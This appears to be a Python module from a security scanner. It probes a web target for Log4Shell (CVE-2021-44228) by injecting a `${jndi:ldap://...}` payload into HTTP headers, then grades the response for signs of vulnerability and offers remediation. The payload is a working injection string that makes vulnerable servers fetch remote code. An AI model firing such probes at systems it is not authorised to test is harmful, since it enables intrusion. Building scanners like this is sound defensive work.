"""Log4Shell JNDI injection probe (CVE-2021-44228).

Active probe yang menyemprotkan payload `${jndi:ldap://...}` ke header dan
parameter umum. Karena verifikasi 100% butuh listener LDAP/DNS, modul ini
melakukan dua jenis validasi yang aman + bebas-callback:

  1. Heuristic: cari banner versi Java/Log4j/Spring di response.
  2. Reflective: bila payload yang dikirim dipantulkan utuh ke response
     body (mis. error page menampilkan input), tandai sebagai TENTATIVE.
  3. Unique-marker: bila response error berubah saat payload diproses
     (perbedaan signifikan ukuran/status vs baseline polos), tandai HIGH.

Untuk validasi penuh, set env CYBLOK_LOG4SHELL_CALLBACK ke domain canary
(mis. canarytokens). Bila domain canary muncul di response dianggap
confirmed.
"""
from __future__ import annotations

import os
import re

from cyberloka.core import Finding, HttpClient, Severity, Target
from cyberloka.core.config import ScanConfig

INJECT_HEADERS = (
    "User-Agent", "Referer", "X-Forwarded-For", "X-Api-Version",
    "X-Forwarded-Host", "Authorization", "Cookie",
)
INJECT_PARAMS = ("q", "search", "name", "id", "user")

LOG4J_BANNER = re.compile(r"log4j[^\d]?(1\.|2\.[0-9]|2\.1[0-6])", re.I)
JAVA_HINT = re.compile(r"\b(java/[\d.]+|tomcat|jetty|jboss|spring|struts)", re.I)


def _make_payload(canary: str, marker: str) -> str:
    return "${jndi:ldap://" + marker + "." + canary + "/x}"


def run(target: Target, config: ScanConfig) -> list[Finding]:
    findings: list[Finding] = []
    client = HttpClient(config)
    canary = os.environ.get("CYBLOK_LOG4SHELL_CALLBACK") or "canary.invalid"
    marker = "cyblok"
    payload = _make_payload(canary, marker)

    try:
        url = target.base_url
        baseline = client.get(url)
        baseline_len = len(baseline.text or "") if baseline else 0
        baseline_status = baseline.status_code if baseline else 0

        # Header injection
        for h in INJECT_HEADERS:
            r = client.get(url, headers={h: payload})
            if r is None:
                continue
            body = r.text or ""
            # 1. Confirmed: callback domain echo dalam response
            if canary != "canary.invalid" and canary in body:
                findings.append(_finding(url, "header", h, payload,
                                         "confirmed", Severity.CRITICAL,
                                         f"Domain canary `{canary}` muncul di response."))
                return findings
            # 2. Banner Log4j vulnerable
            m = LOG4J_BANNER.search(body) or LOG4J_BANNER.search(str(r.headers))
            if m:
                findings.append(_finding(url, "header", h, payload,
                                         "firm", Severity.HIGH,
                                         f"Banner Log4j vulnerable terdeteksi: `{m.group(0)}`."))
                return findings
            # 3. Tentative: payload dipantulkan utuh
            if payload in body:
                findings.append(_finding(url, "header", h, payload,
                                         "tentative", Severity.HIGH,
                                         "Payload JNDI dipantulkan ke response — kemungkinan diproses."))
                return findings
            # 4. Beda response signifikan (heuristik kasar)
            if (r.status_code != baseline_status
                    and abs(len(body) - baseline_len) > 500
                    and JAVA_HINT.search(body)):
                findings.append(_finding(url, "header", h, payload,
                                         "tentative", Severity.HIGH,
                                         f"Stack Java terdeteksi + response berubah "
                                         f"(status {baseline_status}->{r.status_code})."))
                return findings
    finally:
        client.close()
    return findings


def _finding(url: str, where: str, name: str, payload: str,
             confidence: str, severity: Severity, note: str) -> Finding:
    return Finding(
        module="log4shell_probe",
        title=f"Indikasi Log4Shell (CVE-2021-44228) via {where} `{name}`",
        severity=severity,
        description=(
            "Aplikasi Java berbasis Log4j 2.x < 2.17 yang melakukan log "
            "terhadap input user rentan terhadap JNDI lookup. Payload "
            "`${jndi:ldap://...}` memicu server untuk fetch class jahat -> RCE."
        ),
        target=url,
        urls=[url],
        evidence=f"{where}={name}; payload={payload}; {note}",
        cwe="CWE-94",
        confidence=confidence,
        remediation=(
            "Upgrade Log4j ke 2.17.1+. Sebagai mitigasi sementara, set "
            "`-Dlog4j2.formatMsgNoLookups=true` atau `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`. "
            "Pasang WAF rule untuk pola `${jndi:`. Audit semua aplikasi Java pihak ketiga."
        ),
        references=[
            "https://logging.apache.org/log4j/2.x/security.html",
            "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
        ],
    )
